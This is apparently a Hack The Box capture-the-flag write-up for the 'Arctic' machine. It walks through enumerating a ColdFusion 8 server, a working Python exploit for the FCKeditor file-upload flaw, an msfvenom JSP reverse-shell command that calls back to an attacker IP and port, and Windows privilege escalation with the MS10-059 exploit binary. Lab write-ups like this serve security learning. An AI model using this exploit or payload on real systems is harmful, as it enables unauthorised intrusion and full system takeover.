# [Arctic](https://app.hackthebox.eu/machines/9) 

- Another interesting approach: https://teckk2.github.io/writeup/2017/12/27/Arctic.html

Start off with a quick `nmap`:

![nmap](./arctic/nmap.png)

What is the `fmtp` service on port 8500? Check `searchsploit`:

![searchsploit](./arctic/searchsploit.png)

No luck... Try connecting to it raw:

![wget](./arctic/wget.png)

Okay, so this service is a webserver of sorts? Here is `index.html`:

```html
<html>
<head>
<title>Index of /</title></head><body bgcolor="#ffffff">
<h1>Index of /</h1><br><hr><pre><a href="CFIDE/">CFIDE/</a>               <i>dir</i>   03/22/17 08:52 μμ
<a href="cfdocs/">cfdocs/</a>              <i>dir</i>   03/22/17 08:55 μμ
</pre><hr></html>
```

Here is what the browser shows:

![index](./arctic/index.png)

Here is a look inside `CFIDE` and `cfdocs`:

![cfide](./arctic/cfide.png)

![cfdocs](./arctic/cfdocs.png)

The folder `administrator` under `CFIDE` is interesting... Browsing to that page gives the following:

![administrator](./arctic/administrator.png)

So this application is Adobe Cold Fusion version 8? Try `searchsploit` again...

![searchsploit2](./arctic/searchsploit2.png)

Check out the arbitrary file upload and execution exploit for ColdFusion 8.0.1 at https://www.exploit-db.com/exploits/16788:

![exploitdb](./arctic/exploitdb.png)

According to exploitDB, there is a nice Metasploit module for this (https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor)... Write it in Python instead :smile::

```python
import sys
import requests

UPLOAD_PATH = '/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm'
TRIGGER_PATH = '/userfiles/file/'

if sys.version_info.major != 3:
    print('requires Python3')
    exit(-1)

if len(sys.argv) != 4:
    print(f'usage: python3 {sys.argv[0]} <ip> <port> <file>')
    exit(-1)

# upload payload
TARGET = f'http://{sys.argv[1]}:{sys.argv[2]}{UPLOAD_PATH}'
print(f'[*] uploading {sys.argv[3]} to {TARGET} ...')
r = requests.post(TARGET, 
                  files={
                      'newfile': (
                          sys.argv[3].replace('.jsp', '.txt'), 
                          open(sys.argv[3], 'rb'), 
                          'application/x-java-archive'
                      )
                  }, 
                  params={
                      'Command': 'FileUpload', 
                      'Type': 'File', 
                      'CurrentFolder': f'/{sys.argv[3]}\x00'
                  })
if (r.status_code != requests.codes.ok) or ('OnUploadCompleted' not in r.text):
    print('[-] ERROR')
    print(r.text)
    exit(-1)
print('[+] DONE')

# trigger payload
TARGET = f"http://{sys.argv[1]}:{sys.argv[2]}{TRIGGER_PATH}{sys.argv[3]}"
print(f'[*] triggering payload at {TARGET} ...')
r = requests.get(TARGET)
if r.status_code != requests.codes.ok:
    print('[-] ERROR')
    print(r.text)
    exit(-1)
print('[+] DONE')
```

Need a JSP payload (https://netsec.ws/?p=331):

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=6969 -f raw > bubba.jsp
```

And then Execute it:

![exploit1](./arctic/exploit1.png)

And that gives the user shell! Get the user flag:

![user](./arctic/user.png)

Next is privilege escalation. First step is looking for _easy_ kernel known vulnerabilities. Need system and hotfix info to do this:

![systeminfo](./arctic/systeminfo.png)

So there are no hotfixes installed and this is a Windows Server 2008 R2 for x64-based Systems. Use the tool `wes`  (https://github.com/bitsadmin/wesng) to look for kernel vulnerabilities:

![wes](./arctic/wes.png)

Use the CSV output to sort the vulnerabilities by date (earlier should work better):

![sort](./arctic/sort.png)

Starting with the first, CVE-2010-2554, leads to the following with some Googling:

- exploitDB page: https://www.exploit-db.com/exploits/14610
- PoC source code download link: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/14610.zip
- Pre-compiled PoC binary: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
- Exploit code walkthrough: https://itm4n.github.io/chimichurri-reloaded/

Exploit code walkthrough says the user needs `SeImpersonatePrivilege` for it to work:

![whoami](./arctic/whoami.png)

So far so good. Download the compiled PoC binary with `axel`:

```bash
axel -a -n 20 https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS10-059/MS10-059.exe
```

Edit the Python3 ColdFusion8 exploit code to just upload the `MS10-059.exe` file but *not* trigger it as a callback (comment out the lines after `# trigger payload`) and use it to upload `MS10-059.exe` renammed as `MS10-059.jsp`:

![upload](./arctic/upload.png)

Then locate the file on the target system and rename it:

![locate](./arctic/locate.png)

After running the binary without any arguments, the following usage statement is given:

```
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>
```

So set up another listener and test it out:

![exploit2](./arctic/exploit2.png) 

And thats system!

![root](./arctic/system.png)

